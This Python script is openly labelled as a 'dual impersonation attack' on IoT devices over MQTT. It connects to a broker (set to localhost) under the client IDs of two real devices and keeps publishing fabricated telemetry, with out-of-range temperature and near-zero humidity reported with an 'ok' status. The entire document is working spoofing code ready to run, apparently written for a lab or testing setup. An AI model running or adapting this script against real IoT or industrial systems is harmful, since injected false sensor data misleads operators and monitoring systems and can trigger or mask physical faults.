import json
import time
import random
import threading
import paho.mqtt.client as mqtt

BROKER = "localhost"
PORT = 1883

def spoof_device(device_id, temp_range=(80, 110), humidity_range=(0, 5), interval=0.5):
    topic = f"iot/{device_id}/telemetry"

    client = mqtt.Client(
        client_id=device_id,
        callback_api_version=mqtt.CallbackAPIVersion.VERSION2
    )
    client.connect(BROKER, PORT, 60)
    client.loop_start()

    print(f"[INFO] Started impersonating {device_id} on topic {topic}")

    while True:
        payload = {
            "device_id": device_id,
            "ts": time.time(),
            "temp": round(random.uniform(*temp_range), 2),
            "humidity": round(random.uniform(*humidity_range), 2),
            "status": "ok"
        }
        client.publish(topic, json.dumps(payload))
        time.sleep(interval)


t1 = threading.Thread(target=spoof_device, args=("device-1",), daemon=True)
t2 = threading.Thread(target=spoof_device, args=("device-2",), daemon=True)

t1.start()
t2.start()

print("[INFO] Impersonating both device-1 and device-2. Press Ctrl+C to stop.")

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[INFO] Stopped dual impersonation attack.")